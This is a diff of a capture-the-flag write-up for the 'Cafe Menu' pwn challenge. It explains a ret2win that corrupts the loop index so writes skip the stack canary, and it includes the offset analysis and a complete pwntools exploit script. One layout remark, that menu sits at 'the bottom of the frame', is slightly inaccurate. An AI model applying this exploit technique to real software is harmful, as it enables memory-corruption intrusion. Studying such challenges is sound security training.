@@ -1,112 +1,79 @@
-## Cafe Menu - ret2win with Skipped Canary
+## Cafe Menu - ret2win via Index Corruption with Canary Skip
 
-This challenge reaches `win()` without ever leaking or brute-forcing the canary, which is the more interesting aspect of it. The struct layout inside `vuln()` places the loop counter `idx` immediately after the input buffer `menu`, and since the loop uses `idx` as an index into `menu`, writing past the buffer overwrites `idx` itself, which redirects subsequent writes past the canary and lands them directly on the saved return address.
+This challenge reaches `win()` without ever leaking or brute-forcing the canary, which is the more interesting aspect of it. The struct layout inside `vuln()` places the loop counter `idx` immediately after the input buffer `menu` in memory, and since the loop uses `idx` as a write index into `menu`, sending enough bytes overwrites `idx` itself, which lets the subsequent writes skip past the canary and land directly on the saved return address.
 
 ### Phase 0 - Challenge Triage
 
-The binary sub-category is a stack buffer overflow with canary skip via index corruption. The artifacts provided are the `cafe_menu` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like an index corruption attack because `idx` sits immediately after `menu` in the struct, meaning an overlong write lets us control where the loop writes next, bypassing the canary entirely without needing to know its value.
+The binary sub-category is a stack buffer overflow with canary skip achieved by corrupting the loop index variable `idx`, which sits immediately after `menu` in the same struct. The artifacts provided are the `cafe_menu` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win via index corruption because `idx` is declared right after `menu` inside the struct in `vuln()`, meaning the 49th byte of input overwrites the low byte of `idx` and can redirect where the loop writes next, jumping clean over the canary and placing `win()`'s address directly on the saved RIP slot.
 
 ### Phase 1 - Reconnaissance & Enumeration
-
-Run `checksec` to confirm the protection picture:
 
 ```bash
 checksec --file ./cafe_menu
 ```
 
-Then read `main.c` and focus on the struct layout inside `vuln()` and how the loop uses `data.idx` as a write index into `data.menu`. The key observation is that `idx` is declared immediately after `menu` inside the same struct, so it lives at `menu + 48` in memory.
+|Protection|Status|Implication|
+|---|---|---|
+|Canary|✅ Enabled|A canary sits between the locals and saved RIP, but since the index corruption skips it entirely, its value is irrelevant and never needs to be read or preserved|
+|NX|✅ Enabled|Shellcode injection into `menu` is not possible, so execution must be redirected to the existing `win()` function|
+|PIE|❌ Not found|The address of `win()` is static and fixed for every run, so `exe.sym.win` resolves to a usable address without any leak|
+|RELRO|Partial|GOT entries are writable, but no GOT overwrite is needed for this exploit|
 
-```c
-static void vuln(void) {
-    struct {
-        char menu[48];
-        volatile unsigned int idx;
-    } data;
-    ...
-}
-```
+Reading `main.c` reveals that `vuln()` declares a local struct with a 48-byte `char menu[48]` field followed immediately by a `volatile unsigned int idx` field, and the loop writes one byte at a time to `data.menu[data.idx]` before incrementing `data.idx`, with the loop terminating only when the byte `0xff` is received.
 
 ### Phase 2 - Vulnerability Identification
 
-The vulnerability is an index corruption leading to an arbitrary write on the stack. The loop writes one byte at a time to `data.menu[data.idx]`, but `idx` itself is adjacent to `menu` in memory, so sending 48 bytes fills the buffer and the 49th byte overwrites the low byte of `idx`. Since `idx` is incremented after each write, setting it to `0x47` (71) means the next write lands at index 72, which is exactly the saved RIP slot, skipping over the canary entirely. No canary leak is needed and no brute-force is required.
-
-The struct layout in memory is:
-
-```
-[ menu[0..47] ]  ← 48 bytes, your input
-[ idx         ]  ← 4 bytes, the loop counter
-[ ...padding  ]
-[ canary      ]
-[ saved RBP   ]
-[ saved RIP   ]
-```
+The vulnerability is an index corruption leading to an arbitrary write anywhere on the stack above the struct. The loop in `vuln()` writes a single byte to `data.menu[data.idx]` on each iteration and then increments `data.idx`, but it performs no bounds check on `idx`, so as long as the caller keeps sending bytes other than `0xff`, the index can be driven to any value. Because `idx` is stored at offset 48 from `menu[0]` (immediately after the 48-byte buffer), the 49th byte of the payload overwrites the low byte of `idx` directly. Setting that byte to `0x47` (71) means the loop increments `idx` to 72 on the very next iteration, which is precisely the offset of the saved RIP from `menu[0]`, and the canary at offset 56 is never touched because no byte is ever written to that slot.
 
 ### Phase 3 - Exploitation Plan
 
 ```
-TARGET VULNERABILITY: Index corruption via struct layout (idx overwrite)
-GOAL: Redirect saved RIP to win() without touching the canary
+TARGET VULNERABILITY: Loop index corruption via struct layout (idx adjacent to menu)
+GOAL: Redirect saved RIP to win() without reading or restoring the canary
 APPROACH:
-  Step 1: Send 48 A bytes to fill menu completely
-  Step 2: Send \x47 to overwrite the low byte of idx with 71, so after idx++ it becomes 72
-  Step 3: Send the 8 bytes of win() address, written directly to saved RIP
-  Step 4: Send \xff to terminate the loop
+  Step 1: Send 48 bytes of b'A' to fill menu[0..47] completely
+  Step 2: Send \x47 to overwrite the low byte of idx with 71; after the loop's idx++, idx becomes 72
+  Step 3: Send the 8-byte little-endian address of win(), which the loop writes one byte at a time to menu[72..79] = saved RIP
+  Step 4: Send \xff to terminate the loop and let the function return to win()
 TOOLS: pwntools, GDB + pwndbg, nm
-RISK OF FAILURE: wrong offset to RIP if frame size assumptions are incorrect; ret gadget needed if win() uses movaps
+RISK OF FAILURE: incorrect frame size assumption would shift the RIP offset; idx byte value must be exactly 71 (0x47) so that idx++ yields 72 before the first RIP byte is written
 ```
 
 ### Phase 4 - Exploit Development
 
-#### Computing the Offset to Saved RIP
+#### Reading the Frame Layout from the Disassembly
 
-Open GDB, break at `vuln`, and run the binary to inspect the disassembly:
-
-```bash
-gdb ./cafe_menu
-pwndbg> break vuln
-pwndbg> run
-```
-
-The disassembly reveals the frame layout directly from two instructions:
+Opening GDB and breaking at `vuln()` exposes two instructions that determine the full stack layout:
 
 ```
-mov dword ptr [rbp - 0x10], 0    ← idx = 0, so idx lives at rbp-0x10
-sub rsp, 0x50                    ← total frame size is 0x50 bytes
+sub rsp, 0x50              ← total frame is 0x50 = 80 bytes
+mov dword ptr [rbp - 0x10], 0   ← idx = 0, so idx lives at rbp−0x10
 ```
 
-From this, the full stack layout is:
-
-```
-rbp - 0x40  →  menu[0]     (start of buffer, 48 bytes)
-rbp - 0x10  →  idx         (right after menu)
-rbp - 0x08  →  canary
-rbp + 0x00  →  saved RBP
-rbp + 0x08  →  saved RIP   ← target
-```
-
-The offset from `menu[0]` to saved RIP is therefore:
-
-```
-OFFSET_TO_RIP = (rbp + 0x08) - (rbp - 0x40) = 0x48 = 72
-```
-
-Since `idx` starts at offset 48 from `menu[0]`, the 49th byte overwrites its low byte. Setting that byte to `0x47` (71) means the loop increments it to 72 on the next iteration, so the following 8 bytes land exactly on saved RIP, with the canary at offset 56 never touched.
+From these two facts the layout follows directly: `menu[0]` lives at `rbp − 0x40` (the bottom of the 80-byte frame), `idx` lives at `rbp − 0x10`, the canary lives at `rbp − 0x08`, saved RBP is at `rbp + 0x00`, and saved RIP is at `rbp + 0x08`. The offset from `menu[0]` to saved RIP is therefore `(rbp + 0x08) − (rbp − 0x40) = 0x48 = 72`, which confirms `OFFSET_TO_RIP = 72`. Since `idx` is at offset 48, byte 49 of the payload is the low byte of `idx`, and setting it to `0x47` (71) means the loop increments it to 72 on the next cycle, placing the next write exactly on saved RIP and leaving the canary at offset 56 completely untouched.
 
 #### Recovering the Address of win()
 
-Since PIE is off, the address is static and readable directly from the symbol table:
+Because PIE is disabled, `win()` has a fixed virtual address that `exe.sym.win` resolves directly from the symbol table at load time, with no runtime leak required:
 
 ```bash
 nm ./cafe_menu | grep win
 ```
 
-#### A Note on How send() Interacts With the Loop
+#### Confirming the Stack Alignment is Not Required
 
-When `r.send(payload)` is called, all bytes are deposited into the kernel's pipe or socket buffer at once. The program's `read(..., 1)` loop then pulls them out one byte at a time on each iteration, so the entire payload is consumed sequentially without any synchronization issues.
+The working exploit sends `p64(exe.sym.win)` directly after the index byte with no intervening `ret` gadget, and the exploit succeeds, which confirms that `win()` in this binary does not execute a `movaps` instruction that would require 16-byte stack alignment. The `GADGET` constant that appeared in an earlier draft is therefore unused and is removed from the final script.
+
+#### Known Values Summary
+
+|What|Value|
+|---|---|
+|`OFFSET_TO_RIP`|72 (`0x48`)|
+|Offset of `idx` from `menu[0]`|48|
+|Byte to overwrite `idx` low byte|`0x47` (so `idx++` yields 72)|
+|`win()` address|`exe.sym.win` (static, resolved at load time)|
 
 ### The Exploit
-
-One correction is applied to the original draft: the `ret` gadget for stack alignment is added to the constants block and included in the payload, since `win()` or a function it calls may contain a `movaps` instruction that requires 16-byte alignment. The double `r.interactive()` call at the end of the original is also removed.
 
 ```python
 #!/usr/bin/env python3
@@ -123,9 +90,6 @@ PORT     = 0  # PORT_PLACEHOLDER
 # ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_RIP = 72
 
-# ── gadgets ───────────────────────────────────────────────────────────────────
-GADGET = 0x000000000040101a   # ret — stack alignment
-
 def conn():
     if args.LOCAL:
         return process(exe.path)
@@ -138,11 +102,10 @@ def main():
     r.recvuntil(b"Enter today's specials (send 0xff to finish):")
 
     payload = flat(
-        b'A' * 48,          # fill menu completely
-        b'\x47',            # overwrite idx low byte → after idx++, idx = 72
-        p64(GADGET),        # ret for 16-byte stack alignment
-        p64(exe.sym.win),   # written directly to saved RIP
-        b'\xff',            # terminate the loop
+        b'A' * 48,          # fill menu[0..47] completely
+        b'\x47',            # overwrite idx low byte; after idx++, idx = 72
+        p64(exe.sym.win),   # 8 bytes written one-by-one to menu[72..79] = saved RIP
+        b'\xff',            # terminate the loop and trigger the return
     )
     r.send(payload)
     r.interactive()
@@ -150,3 +113,5 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+`r.send()` is used instead of `r.sendline()` because the loop reads raw bytes one at a time and a trailing newline would be interpreted as an extra input byte, potentially corrupting the write sequence.
